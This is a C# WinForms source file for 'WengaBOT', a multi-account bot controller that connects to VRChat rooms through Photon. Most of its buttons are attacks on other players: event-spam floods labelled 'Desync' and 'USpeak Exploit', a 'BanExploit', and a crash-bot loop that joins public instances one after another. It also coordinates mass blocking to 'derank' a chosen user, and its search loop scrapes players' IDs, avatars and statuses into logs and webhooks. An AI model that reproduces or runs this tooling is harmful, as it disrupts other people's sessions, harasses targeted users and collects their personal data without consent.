using Photon.Realtime;
using System;
using System.IO;
using System.Collections.Generic;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using TheBotUI.Core;
using System.Linq;
using VRChatAPI.Endpoints;
using TheBotUI.VRCAPI.Responses;
using System.Net;
using System.Collections.Specialized;
using ExitGames.Client.Photon;
using System.Collections;
using VRChatAPI;
using Newtonsoft.Json;
using VRChatAPI.Responses;
using static TheBotUI.Core.SearchWebhooks;
#if NET472
using System.Diagnostics;
#endif

namespace TheBotUI {

    public partial class Form1 : Form {
        public static Bot selectedBot;

        public Form1() 
        {
            InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e) 
        {
            Console.ForegroundColor
            = ConsoleColor.Red;
            Console.WriteLine("[WengaBOT] Disconnecting all Bots. . .");
            Console.WriteLine($"[Day API] Loging All bots Out. .  .");
            new Thread(() =>
            {
                Invoke(new MethodInvoker(() =>
                {
                    foreach (ListViewItem item in botInstancesList.Items)
                    {
                        var bot = (Bot)item.Tag;
                        if (bot.PhotonClient.InRoom)
                        {
                            bot.PhotonClient.OpLeaveRoom(false);
                        }
                    }
                    playerList.Items.Clear();
                }));
            }).Start();
            Console.WriteLine("[WengaBOT] All bots are disconnected!");
            Thread.Sleep(1000);
            Application.Exit();
        }

        private void Button2_Click(object sender, EventArgs e) {
            this.WindowState = FormWindowState.Maximized;
        }

        public static void CustomOnEvent(EventData eventData)
        {
            if (GlobalVars.EventLog)
            {
                if (!GlobalVars.IgnoreEvents.Contains(eventData.Code))
                {
                    Console.WriteLine($"[Event Logger] Event From {eventData.Sender} [{PhotonExtensions.GetPlayer(eventData.Sender)?.GetDisplayName()}]");
                    Console.WriteLine(JsonConvert.SerializeObject(eventData, Formatting.Indented));
                }
            }
        }

        private void Button3_Click(object sender, EventArgs e) {
            this.WindowState = FormWindowState.Minimized;
        }

        private bool _dragging = false;
        private Point _offset;
        private Point _start_point = new Point(0, 0);

        private void panel2_MouseMove(object sender, MouseEventArgs e) {
            if (_dragging) {
                Point p = PointToScreen(e.Location);
                this.Location = new Point(p.X - this._start_point.X, p.Y - this._start_point.Y);
            }
        }

        private void panel2_MouseUp(object sender, MouseEventArgs e) {
            _dragging = false;
        }

        private void panel2_MouseDown(object sender, MouseEventArgs e) {
            _dragging = true;
            _start_point = new Point(e.X, e.Y);
        }

        private void listView1_itemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {
            if (e.Item.Tag != null)
            {
                selectedBot = (Bot)e.Item.Tag;
                if (selectedBot == null)
                {
                    MessageBox.Show("Selected bot was null!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                new Thread(() =>
                {
                    while (true)
                    {
                        Invoke(new MethodInvoker(() =>
                        {
                            if (selectedBot.PhotonClient != null)
                            {
                                connectionStatusVarLabel.Text = selectedBot.PhotonClient.IsConnectedAndReady ? "Connected" : "Not connected";
                                connectionStatusVarLabel.ForeColor = selectedBot.PhotonClient.IsConnectedAndReady ? Color.Green : Color.DarkRed;
                                pingVarLabel.Text = selectedBot.PhotonClient.LoadBalancingPeer.RoundTripTime.ToString();
                                pingVarLabel.ForeColor = Color.Green;
                                inRoomVarLabel.Text = selectedBot.PhotonClient.InRoom ? "Yes" : "No";
                                inRoomVarLabel.ForeColor = selectedBot.PhotonClient.InRoom ? Color.Green : Color.DarkRed;
                                playersVarLabel.Text = selectedBot.PhotonClient.CurrentRoom != null && selectedBot.PhotonClient.CurrentRoom.PlayerCount > 0 ? selectedBot.PhotonClient.CurrentRoom.PlayerCount.ToString() + "/" + selectedBot.PhotonClient.CurrentRoom.MaxPlayers.ToString() : "N/A";
                                playersVarLabel.ForeColor = selectedBot.PhotonClient.CurrentRoom != null && selectedBot.PhotonClient.CurrentRoom.PlayerCount > 0 ? Color.Green : Color.DarkRed;
                                MasterVarLabel.Text = selectedBot.PhotonClient.InRoom ? selectedBot.PhotonClient.CurrentRoom.MasterClientId.ToString() : "N/A";
                                MasterVarLabel.ForeColor = selectedBot.PhotonClient.InRoom ? Color.Green : Color.DarkRed;
                                ServerVarLabel.Text = selectedBot.PhotonClient.InRoom ? selectedBot.PhotonClient.CurrentRoom.IsVisible ? "Yes" : "No" : "N/A";
                                ServerVarLabel.ForeColor = selectedBot.PhotonClient.InRoom ? selectedBot.PhotonClient.CurrentRoom.IsVisible ? Color.Green : Color.DarkRed : Color.DarkRed;
                                AllMasterVarLabel.Text = selectedBot.PhotonClient.PlayersOnMasterCount.ToString();
                                AllMasterVarLabel.ForeColor = Color.Green;
                                AllPlayersVarLabel.Text = selectedBot.PhotonClient.PlayersInRoomsCount.ToString();
                                AllPlayersVarLabel.ForeColor = Color.Green;
                                AllRoomsVarLabel.Text = selectedBot.PhotonClient.RoomsCount.ToString();
                                AllRoomsVarLabel.ForeColor = Color.Green;
                                ConnectionVarLabel.Text = selectedBot.PhotonClient.MasterServerAddress.ToString();
                                ConnectionVarLabel.ForeColor = Color.Green;
                                MasterDisconnect.Text = selectedBot.PhotonClient.InRoom ? "Desync Masterclient" + " [" + selectedBot.PhotonClient.CurrentRoom.MasterClientId.ToString() + "]" : "Desync Masterclient";
                                OpenVarLabel.Text = selectedBot.PhotonClient.InRoom ? selectedBot.PhotonClient.CurrentRoom.IsOpen ? "Yes" : "No" : "N/A";
                                OpenVarLabel.ForeColor = selectedBot.PhotonClient.InRoom ? selectedBot.PhotonClient.CurrentRoom.IsOpen ? Color.Green : Color.DarkRed : Color.DarkRed;
                                RegionVarLabel.Text = selectedBot.PhotonClient.CloudRegion.ToString();
                                RegionVarLabel.ForeColor = Color.Green;
                                AdressVarLabel.Text = selectedBot.PhotonClient.InRoom ? selectedBot.PhotonClient.GameServerAddress.ToString() : "";
                                AdressVarLabel.ForeColor = selectedBot.PhotonClient.InRoom ? Color.Green : Color.DarkRed;
                            }
                        }));
                        Thread.Sleep(1000);
                    }
                }).Start();
                new Thread(() =>
                {
                    while (true)
                    {
                        if (selectedBot.PhotonClient.InRoom)
                        {
                            if (selectedBot.PhotonClient.CurrentRoom.Players != null)
                            {
                                if (selectedBot.PhotonClient.CurrentRoom.Players.Count > 0)
                                {
                                    Invoke(new MethodInvoker(() => { playerList.Items.Clear(); }));
                                    List<ListViewItem> players = new List<ListViewItem>();
                                    if (GlobalVars.Search)
                                        return;
                                    if (selectedBot.PhotonClient.CurrentRoom != null)
                                    {
                                        foreach (var player in selectedBot.PhotonClient.CurrentRoom.Players.Values)
                                        {
                                            if (!player.CustomProperties.ContainsKey("user"))
                                            {
                                                ListViewItem p = new ListViewItem("user is null");
                                                p.Tag = player;
                                                p.SubItems.Add(player.ActorNumber.ToString());
                                                players.Add(p);
                                            }
                                            else if (!((Dictionary<string, object>)player.CustomProperties["user"]).ContainsKey("displayName"))
                                            {
                                                ListViewItem p = new ListViewItem("user['displayName'] is null");
                                                p.Tag = player;
                                                p.SubItems.Add(player.ActorNumber.ToString());
                                                players.Add(p);
                                            }
                                            else
                                            {
                                                Dictionary<string, object> dictionary = (Dictionary<string, object>)player.CustomProperties["user"];
                                                ListViewItem p = new ListViewItem(dictionary["displayName"].ToString());
                                                p.Tag = player;
                                                p.SubItems.Add(player.ActorNumber.ToString());
                                                players.Add(p);
                                            }
                                            
                                        }
                                    }
                                    else
                                    {
                                        Console.ForegroundColor
                                            = ConsoleColor.Red;
                                        MessageBox.Show("[WengaBOT] CurrentRoom was null!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                        return;
                                    }
                                    players.OrderBy(new Func<ListViewItem, object>(x => x.SubItems));
                                    Invoke(new MethodInvoker(() => { playerList.Items.AddRange(players.ToArray()); }));
                                }
                            }
                        }
                        Thread.Sleep(2500);
                    }
                }).Start();
            }
        }

        public void Auth()
        {
            {
                botInstancesList.Items.Add("Кря");
                botInstancesList.Items.Add("Кря");
                Thread.Sleep(2000);
                {
                    Console.ForegroundColor
                    = ConsoleColor.Green;
                    Console.WriteLine("Items Cleaned");
                    botInstancesList.Items.Clear();
                    playerList.Items.Clear();
                }
                Thread.Sleep(1000);
                {
                    Console.ForegroundColor
                    = ConsoleColor.Blue;
                    Console.WriteLine("Lists Cleaned");
                    botInstancesList.Items.Clear();
                    playerList.Items.Clear();
                }
                Console.ForegroundColor
                    = ConsoleColor.DarkGreen;
                Console.WriteLine("Fully Cleaned");
                string[] authdata = File.ReadAllLines("Auth/AuthNormal.txt");
                foreach (string login in authdata)
                {
                    string[] userpass = login.Split(new char[] { ':' }, 2);
                    new Thread(() => {
                        Bot bot = new Bot(userpass[0], userpass[1]);
                        if (bot != null)
                        {
                            if (bot.APIClient != null)
                            {
                                Invoke(new MethodInvoker(() => {
                                    ListViewItem item = new ListViewItem(bot.APIClient.Variables.UserSelfRES.displayName);
                                    item.Tag = bot;
                                    botInstancesList.Items.Add(item);
                                }));
                                Console.Title = "[WengaBOT] Bots are active...";
                            }
                            else
                            {
                                MessageBox.Show("[WengaBOT] API failed to initialize", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }
                        }
                        else
                        {
                            MessageBox.Show("[WengaBOT] Bot failed to initialize", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }).Start();
                }
            }
        }
        public void NormalAuth_Click(object sender, EventArgs e) 
        {
            Auth();
        }

        private void JoinRoomButton_Click(object sender, EventArgs e) 
        {
            selectedBot.PhotonClient.JoinRoom(worldAInstanceIDTextBox.Text);
            Console.WriteLine(selectedBot.PhotonClient.InRoom ? "[WengaBOT] Successfully joined to room!" : "[WengaBOT] JoinOrCreateRoom failed!");
        }
        private void LeaveRoomButton_Click(object sender, EventArgs e) 
        {
            new Thread(() => 
            {
                Disconnecting = true;
                if (selectedBot.PhotonClient.InRoom)
                    selectedBot.PhotonClient.OpLeaveRoom(false);
                else
                    MessageBox.Show("[WengaBOT] Can't leave room when not in a room!", "[WengaBOT] Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Disconnecting = false;
                playerList.Items.Clear();
                Thread.Sleep(7000);
                Disconnecting = false;
            }) { IsBackground = true }.Start();
        }

        private void JoinLastRoomButton_Click(object sender, EventArgs e)
        {
            bool isJoined = selectedBot.PhotonClient.JoinRoom(worldAInstanceIDTextBox.Text);
            Console.WriteLine(isJoined ? "[WengaBOT] Successfully joined to room!" : "[WengaBOT] JoinOrCreateRoom failed!");
            Thread.Sleep(3000);
            selectedBot.PhotonClient.InstantiateSelf();

        }
        private void InstantiateButton_Click(object sender, EventArgs e) 
        {
            if (selectedBot.PhotonClient.InRoom) 
            {
                selectedBot.PhotonClient.InstantiateSelf();
            }
        }
        int Desync = new Random().Next(int.MinValue + 100, int.MaxValue - 100);
        private void InstantiateInvisButton_Click(object sender, EventArgs e) {
            if (selectedBot.PhotonClient.InRoom) 
            {
                new Thread(() =>
                {
                    Console.ForegroundColor
                        = ConsoleColor.DarkRed;
                    Console.WriteLine("[WengaBOT] Started Desync");
                    for (int ii = 0; ii < 20; ii++)
                    {
                        150.EventSpammer(5, () =>
                        {
                            GlobalVars.Desync = true;
                            foreach (ListViewItem item in botInstancesList.Items)
                            {
                                var bot = (Bot)item.Tag;
                                bot.PhotonClient.OpRaiseEvent(210, new int[] { Desync, bot.PhotonClient.LocalPlayer.ActorNumber }, new RaiseEventOptions() { Receivers = ReceiverGroup.All }, SendOptions.SendReliable);
                                bot.PhotonClient.OpRaiseEvent(209, new int[] { Desync, bot.PhotonClient.LocalPlayer.ActorNumber }, new RaiseEventOptions() { Receivers = ReceiverGroup.All}, SendOptions.SendReliable);
                            }
                        });
                        Thread.Sleep(2000);
                    }
                    Console.ForegroundColor
                        = ConsoleColor.DarkGreen;
                    Console.WriteLine("[WengaBOT] Lobby Desynced");
                    GlobalVars.Desync = false;
                })
                { IsBackground = true }.Start();
            }
        }
        private void button1_Click_1(object sender, EventArgs e)
        {
            Console.ForegroundColor
            = ConsoleColor.Green;
            Console.WriteLine("[WengaBOT] Instanciating all Bots");
            new Thread(() =>
            {
                Invoke(new MethodInvoker(() =>
                {

                    foreach (ListViewItem item in botInstancesList.Items)
                    {
                        var bot = (Bot)item.Tag;
                        if (bot.PhotonClient.InRoom)
                        {
                            bot.PhotonClient.InstantiateSelf();
                        }
                        Thread.Sleep(100);
                    }
                }));
            }).Start();
        }

        private void eventLogsRadioButton_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            Console.ForegroundColor
            = ConsoleColor.Blue;
            Console.WriteLine("Cleaned!");
            botInstancesList.Items.Clear();
            playerList.Items.Clear();
        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            Console.ForegroundColor
            = ConsoleColor.DarkGray;
            Console.WriteLine("[WengaBOT] Connecting all Bots");
            Thread.Sleep(1500);
            if (string.IsNullOrEmpty(worldAInstanceIDTextBox.Text) || !worldAInstanceIDTextBox.Text.Contains("wrld"))
            {
                worldAInstanceIDTextBox.Text = "[WengaBOT] Incorrect format or empty!";
            }
            else
            {
                new Thread(() =>
                {
                    Invoke(new MethodInvoker(() =>
                    {
                        foreach (ListViewItem item in botInstancesList.Items)
                        {
                            Thread.Sleep(500);
                            var bot = (Bot)item.Tag;
                            bool isJoined = bot.PhotonClient.JoinRoom(worldAInstanceIDTextBox.Text);
                            Console.WriteLine(isJoined ? "[WengaBOT] Successfully joined to room!" : "[WengaBOT] JoinOrCreateRoom failed!");
                            Thread.Sleep(500);
                        }
                    }));
                }).Start();
            }
        }

        public static bool Disconnecting = false;

        public void DisconnectAllBots()
        {
            new Thread(() =>
            {
                Disconnecting = true;
                Console.ForegroundColor
                = ConsoleColor.Red;
                Console.WriteLine("[WengaBOT] All bots on the instance are disconnected!");
                Invoke(new MethodInvoker(() =>
                {
                    foreach (ListViewItem item in botInstancesList.Items)
                    {
                        var bot = (Bot)item.Tag;
                        if (bot.PhotonClient.InRoom)
                        {
                            Thread.Sleep(100);
                            bot.PhotonClient.OpLeaveRoom(false);
                            playerList.Items.Clear();
                        }
                    }
                    playerList.Items.Clear();
                }));
                Thread.Sleep(7000);
                Disconnecting = false;
            })
            { IsBackground = true }.Start();
        }
        private void button4_Click(object sender, EventArgs e)
        {
            DisconnectAllBots();
        }

        private void usernameLabel_Click(object sender, EventArgs e)
        {

        }

        private void usernameTextBox_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void button5_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button6_Click(object sender, EventArgs e)
        {

            {
                if (selectedBot != null)
                {
                    selectedBot.PhotonClient.JoinRoom(worldAInstanceIDTextBox.Text);
                }
                Thread.Sleep(2000);
                string ShowStats = "CurrentDate:" + DateTime.Now + "\nWorldID:" + worldAInstanceIDTextBox.Text + "\nPlayerCount:" + selectedBot.PhotonClient.CurrentRoom.PlayerCount.ToString() + "\n";
                foreach (var item in selectedBot.PhotonClient.CurrentRoom.Players)
                {
                    Dictionary<string, object> dictionary = (Dictionary<string, object>)item.Value.CustomProperties["user"];
                    Dictionary<string, object> tictionary = (Dictionary<string, object>)item.Value.CustomProperties["avatarDict"];

                    var AvatarID = tictionary["id"];
                    var UserID = dictionary["id"];
                    var Displayname = dictionary["displayName"];
                    var Status = dictionary["status"];
                    var Description = dictionary["statusDescription"];

                    ShowStats += "\nDisplayname:" + Displayname.ToString() + "\nUserID:" + UserID.ToString() + "\nAvatarID:" + AvatarID.ToString() + "\nAllow Copying:" + UserRES.allowAvatarCopying.ToString() + "\nStatus:" + Status.ToString() + "\nDescription:" + Description.ToString() + "\nIs Friend:" + UserRES.isFriend.ToString() + "\n----------------------------:";
                }
                string tath = @"Logger\\" + DateTime.Now.ToString("dd/MM") + ".txt";

                if (!File.Exists(tath))
                {
                    string[] createText = { "----WengaBOT Logger----" };
                    File.WriteAllLines(tath, createText);
                }

                string appendText = ShowStats + Environment.NewLine;
                File.AppendAllText(tath, appendText);

                selectedBot.PhotonClient.OpLeaveRoom(false);
                playerList.Items.Clear();
                Console.WriteLine("[WengaBOT] Created Log");
            }
        }
        private void Searchbutton_Click(object sender, EventArgs e)
        {
            SearchFunc();
        }
        public void SearchFunc()
        {
            new Thread(async()=>
            {
                try
                {
                    string[] Worlds = File.ReadAllLines(@"Worlds.txt");
                    GlobalVars.Search = true;
                    Console.ForegroundColor
                        = ConsoleColor.Cyan;
                    foreach (string worldID in Worlds)
                    {
                        Console.ForegroundColor
                                    = ConsoleColor.Cyan;
                        Thread.Sleep(1000);
                        WorldRES worldRES = await VRChatAPI.Endpoints.Worlds.GetWorld(worldID);
                        //WorldRES worldRES = await selectedBot.APIClient.Worlds.GetWorlds(worldID);
                        Console.WriteLine("[WengaBOT] Searching World: " + worldID + "  |name: " + worldRES.name + "   |Instances: " + worldRES.instances.Length);
                        if (worldRES.publicOccupants != 0)
                        {
                            List<string> Instances = VRChatAPI.Endpoints.Worlds.GetInstances(worldRES).ToList();
                            foreach (var instancetag in Instances)
                            {
                                Console.ForegroundColor
                                    = ConsoleColor.Cyan;
                                Console.WriteLine("[WengaBOT] INSTANCE: " + instancetag);
                            }
                            foreach (string Instance in Instances)
                            {
                                Console.ForegroundColor
                                    = ConsoleColor.Cyan;
                                Thread.Sleep(500);
                                Console.WriteLine("[WengaBOT] Joining: " + worldID + ":" + Instance + " Cap: " + Convert.ToString(worldRES.capacity));
                                JoinRoom(worldRES, worldID + ":" + Instance);
                                Thread.Sleep(3500);
                            }
                        }
                    }
                    Console.WriteLine("----Search Stopped----");
                    GlobalVars.Search = false;
                }
                catch (Exception e5)
                {
                    Console.WriteLine(e5.ToString());
                }
                SearchFunc();
            }){IsBackground = true}.Start();   
        }

        public void JoinRoom(WorldRES world, string WorldInstanceID)
        {
            try
            {
                if (selectedBot != null)
                {
                    bool isJoined = selectedBot.PhotonClient.JoinRoom(WorldInstanceID);
                    Thread.Sleep(2200);
                    if (selectedBot.PhotonClient.CurrentRoom == null)
                    {
                        Console.ForegroundColor
                        = ConsoleColor.Red;
                        Console.WriteLine("[WengaBOT] Error Room is null");
                    }
                    foreach (var item in selectedBot.PhotonClient.CurrentRoom.Players)
                    {
                        new Thread(() => 
                        {
                            Console.ForegroundColor
                                = ConsoleColor.Magenta;
                            SearchWebhooks.DoWebhooks(item.Value, world, WorldInstanceID);
                        }) { IsBackground = true }.Start();
                    }
                    Thread.Sleep(4000);
                    Console.ForegroundColor
                            = ConsoleColor.Red;
                    Console.WriteLine("[WengaBOT] Leaving Room");
                    selectedBot.PhotonClient.OpLeaveRoom(false);
                }
            }
            catch (Exception)
            {

            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void buttonSearchAuth_Click(object sender, EventArgs e)
        {
            //Replace this with Authcookie stuff 
        }

        private void CrashSearch_Click(object sender, EventArgs e)
        {
            CrashSearchFunc();
        }

        public async void CrashSearchFunc()
        {
            try
            {
                string[] Worlds = File.ReadAllLines(@"WorldsCrash.txt");
                GlobalVars.Search = true;
                Console.ForegroundColor
                    = ConsoleColor.Cyan;
                foreach (string worldID in Worlds)
                {
                    Thread.Sleep(15000);
                    Console.ForegroundColor
                                = ConsoleColor.Cyan;
                    WorldRES worldRES = await VRChatAPI.Endpoints.Worlds.GetWorld(worldID);
                    Console.WriteLine("[WengaBOT] Searching World: " + worldID + "  |name: " + worldRES.name + "   |Instances: " + worldRES.instances.Length);
                    if (worldRES.publicOccupants != 0)
                    {
                        Thread.Sleep(1000);
                        List<string> Instances = VRChatAPI.Endpoints.Worlds.GetInstances(worldRES).ToList();
                        foreach (var instancetag in Instances)
                        {
                            Console.ForegroundColor
                                = ConsoleColor.Cyan;
                            Console.WriteLine("[WengaBOT] INSTANCE: " + instancetag);
                        }
                        foreach (string Instance in Instances)
                        {
                            Console.ForegroundColor
                                = ConsoleColor.Cyan;
                            Console.WriteLine("[WengaBOT] Joining: " + worldID + ":" + Instance + " Cap: " + Convert.ToString(worldRES.capacity));
                            CrashJoinRoom(worldID + ":" + Instance);
                            Thread.Sleep(1500);
                        }
                    }
                }
                Console.WriteLine("----Search Stopped----");
                GlobalVars.Search = false;
            }
            catch (Exception e5)
            {
                Console.WriteLine(e5.ToString());
            }
            CrashSearchFunc();
        }
        public void CrashJoinRoom(string WorldInstanceID)
        {
            try
            {
                if (selectedBot != null)
                {
                    bool isJoined = selectedBot.PhotonClient.JoinRoom(WorldInstanceID);
                    Thread.Sleep(3000);
                    Console.ForegroundColor
                        = ConsoleColor.Green;
                    Console.WriteLine("[WengaBOT] Instanciating Crashbot");
                    if (selectedBot.PhotonClient.InRoom)
                    {
                        selectedBot.PhotonClient.InstantiateSelf();
                    }
                    Thread.Sleep(10000);
                    if (selectedBot.PhotonClient.CurrentRoom == null)
                    {
                        Console.ForegroundColor
                        = ConsoleColor.Red;
                        Console.WriteLine("[WengaBOT] Error Room is null");
                        Thread.Sleep(500);
                    }
                    Console.ForegroundColor
                    = ConsoleColor.Red;
                    Console.WriteLine("[WengaBOT] Leaving Room");
                    Console.ForegroundColor
                    = ConsoleColor.Cyan;
                    selectedBot.PhotonClient.OpLeaveRoom(false);
                    playerList.Items.Clear();
                }    
            }
            catch (Exception)
            {

            }
        }

        private void DerankInput_TextChanged(object sender, EventArgs e)
        {

        }

        private void DerankButton_Click(object sender, EventArgs e)
        {
            string id = DerankInput.Text;
            if (!id.Contains("usr_"))
            {
                Console.WriteLine("[WengaBOT]" + id + " Is not a Valid User Id");
                DerankInput.Text = "Invalid ID";
            }
            foreach(ListViewItem item in botInstancesList.Items)
            {
                Bot bot = (Bot)item.Tag;
                Console.WriteLine($"[WengaBOT] Sending Moderation With type {VRCAPI.Endpoints.Type.block} to {id}");
                bot.APIClient.Moderation.SendModeration(id, VRCAPI.Endpoints.Type.block);
                //Thread.Sleep(500);
                //Console.WriteLine($"[WengaBOT] Sending Moderation With type {VRCAPI.Endpoints.Type.hideAvatar} to {id}");
                //bot.APIClient.Moderation.SendModeration(id, VRCAPI.Endpoints.Type.hideAvatar);
                //Thread.Sleep(500);
                //Console.WriteLine($"[WengaBOT] Sending Moderation With type {VRCAPI.Endpoints.Type.mute} to {id}");
                //bot.APIClient.Moderation.SendModeration(id, VRCAPI.Endpoints.Type.mute);
            }
        }
       

        private void BanExploit_Click(object sender, EventArgs e)
        {
            if (selectedBot.PhotonClient.InRoom)
            {
                Console.ForegroundColor
                    = ConsoleColor.Red;
                Console.WriteLine("[WengaBOT] Exploiting Ban. Please wait...");
                Thread.Sleep(10000);
                selectedBot.PhotonClient.BanInstanciate();
            }
            else
            {
                Console.ForegroundColor
                    = ConsoleColor.Red;
                Console.WriteLine("[WengaBOT] Connect the bot first before Banning");
            }
        }

        public static string AppVersion;
        public void GetAppVersion()
        {
            var directory = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"Low\VRChat\VRChat");
            if (directory != null && directory.Exists)
            {
                FileInfo target = null;
                foreach (var info in directory.GetFiles("output_log_*.txt", SearchOption.TopDirectoryOnly))
                {
                    if (target == null || info.LastAccessTime.CompareTo(target.LastAccessTime) >= 0)
                    {
                        target = info;
                    }
                }
                if (target != null)
                {
                    var fs = new FileStream(target.FullName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                    using (var sr = new StreamReader(fs))
                    {
                        string line;

                        while ((line = sr.ReadLine()) != null)
                        {
                            if (line != null)
                            {
                                if (line.Contains("[VRCFlowNetworkManager] Using server url: "))
                                {
                                    string[] arr = line.Split(new[] { "[VRCFlowNetworkManager] Using server url: " }, StringSplitOptions.None);
                                    AppVersion = arr[1] + "_2.5";
                                    File.Delete("release.txt");
                                    Thread.Sleep(100);
                                    File.AppendAllText("release.txt", AppVersion + Environment.NewLine);
                                    Console.ForegroundColor
                                        = ConsoleColor.Green;
                                    Console.WriteLine("[WengaBOT] Release updated to:" + AppVersion);
                                }
                            }
                        }
                    }
                }
            }
        }

        public static string CurrentRoom;
        public static void FetchRoom()
        {
            var directory = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"Low\VRChat\VRChat");
            if (directory != null && directory.Exists)
            {
                FileInfo target = null;
                foreach (var info in directory.GetFiles("output_log_*.txt", SearchOption.TopDirectoryOnly))
                {
                    if (target == null || info.LastAccessTime.CompareTo(target.LastAccessTime) >= 0)
                    {
                        target = info;
                    }
                }
                if (target != null)
                {
                    var fs = new FileStream(target.FullName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                    using (var sr = new StreamReader(fs))
                    {
                        string line;

                        while ((line = sr.ReadLine()) != null)
                        {
                            if (line != null)
                            {
                                if (line.Contains("[RoomManager] Joining w"))
                                {
                                    string[] arr = line.Split(new[] { "[RoomManager] Joining " }, StringSplitOptions.None);
                                    CurrentRoom = arr[1];
                                }
                            }
                        }
                    }
                }
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            GetAppVersion();
        }

        private void panel8_Paint(object sender, PaintEventArgs e)
        {

        }

        private void SwitchAvi_Click(object sender, EventArgs e)
        {
            var id = AvatarSwitchText.Text;
            if (id.Contains("avtr_"))
            {
                // -Day: Add later
                Console.WriteLine("[Day:] WIP");
            }
            else
            {
                Console.WriteLine("[WengaBOT] Invalid Avatar ID");
                AvatarSwitchText.Text = "Invalid ID";
            }
 
        }

        public void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.CheckState == CheckState.Checked)
            {
                GlobalVars.ShouldPauseRoomCheckerLoop = false;
                Console.ForegroundColor
                = ConsoleColor.DarkGreen;
                Console.WriteLine("[WengaBOT] Enabled Followmode");
                RoomCheckerLoop();
            }

            else if (checkBox1.CheckState == CheckState.Unchecked)
            {
                GlobalVars.ShouldPauseRoomCheckerLoop = true;
                DisconnectAllBots();
                Console.ForegroundColor
                = ConsoleColor.Red;
                Console.WriteLine("[WengaBOT] Disabled Followmode");
            }
        }
        public void RoomCheckerLoop()
        {
                new Thread(() =>
                {
                    while (true)
                    {
                        if (!GlobalVars.ShouldPauseRoomCheckerLoop)
                        {
                            if (checkBox1.CheckState == CheckState.Checked)
                            {
                                {
                                    FetchRoom();
                                    foreach (ListViewItem item in botInstancesList.Items)
                                    {
                                        var bot = (Bot)item.Tag;
                                        if (bot.PhotonClient.InRoom)
                                        {
                                            if (bot.PhotonClient.CurrentRoom.Name != CurrentRoom)
                                                bot.PhotonClient.OpLeaveRoom(false);
                                            Thread.Sleep(1500);
                                        }
                                        else
                                        {
                                            bot.PhotonClient.JoinRoom(CurrentRoom);
                                            Thread.Sleep(3500);
                                            bot.PhotonClient.InstantiateSelf();
                                        }
                                    }
                                }
                            }
                        }
                    }
                })
                { IsBackground = true }.Start();
        }

        private void JoinAll_Click_1(object sender, EventArgs e)
        {
            foreach (ListViewItem item in botInstancesList.Items)
            {
                var bot = (Bot)item.Tag;
                bool isJoined = bot.PhotonClient.JoinRoom(worldAInstanceIDTextBox.Text);
                Console.WriteLine(isJoined ? "[WengaBOT] Successfully joined to room!" : "[WengaBOT] JoinOrCreateRoom failed!");
                Thread.Sleep(3000);
                bot.PhotonClient.InstantiateSelf();
            }
        }

        public static bool MasterDesync = false;
        private void MasterDisconnect_Click(object sender, EventArgs e)
        {
            if (selectedBot.PhotonClient.InRoom)
            {
                new Thread(() =>
                {
                    Console.ForegroundColor
                        = ConsoleColor.DarkRed;
                    Console.WriteLine("[WengaBOT] Started Desync on Master");
                    for (int ii = 0; ii < 20; ii++)
                    {
                        100.EventSpammer(5, () =>
                        {
                            GlobalVars.Desync = true;
                            MasterDesync = true;
                            foreach (ListViewItem item in botInstancesList.Items)
                            {
                                var bot = (Bot)item.Tag;
                                bot.PhotonClient.OpRaiseEvent(210, new int[] { Desync, bot.PhotonClient.LocalPlayer.ActorNumber }, new RaiseEventOptions() { Receivers = ReceiverGroup.MasterClient }, SendOptions.SendReliable);
                                bot.PhotonClient.OpRaiseEvent(209, new int[] { Desync, bot.PhotonClient.LocalPlayer.ActorNumber }, new RaiseEventOptions() { Receivers = ReceiverGroup.MasterClient }, SendOptions.SendReliable);
                            }
                        });
                        Thread.Sleep(2000);
                    }
                    Console.ForegroundColor
                        = ConsoleColor.DarkGreen;
                    Console.WriteLine("[WengaBOT] Masterclient Desynced");
                    GlobalVars.Desync = false;
                    MasterDesync = false;
                })
                { IsBackground = true }.Start();
            }
        }

        private void button7_Click_1(object sender, EventArgs e)
        {
            if (selectedBot.PhotonClient.InRoom)
            {
                new Thread(() =>
                {
                    Console.ForegroundColor
                        = ConsoleColor.DarkRed;
                    Console.WriteLine("[WengaBOT] Started USpeak Exploit");
                    for (int ii = 0; ii < 20; ii++)
                    {
                        400.EventSpammer(5, () =>
                        {
                            GlobalVars.Desync = true;
                            foreach (ListViewItem item in botInstancesList.Items)
                            {
                                var bot = (Bot)item.Tag;
                                bot.PhotonClient.OpRaiseEvent(1, new byte[69], new RaiseEventOptions() { Receivers = ReceiverGroup.All }, SendOptions.SendReliable);
                            }
                        });
                        Thread.Sleep(2000);
                    }
                    Console.ForegroundColor
                        = ConsoleColor.DarkGreen;
                    Console.WriteLine("[WengaBOT] USpeak Done");
                    GlobalVars.Desync = false;
                })
                { IsBackground = true }.Start();
            }
        }
        public void EventLogger_CheckedChanged(object sender, EventArgs e)
        {
            GlobalVars.EventLog = EventLogger.Checked;
        }
    }
}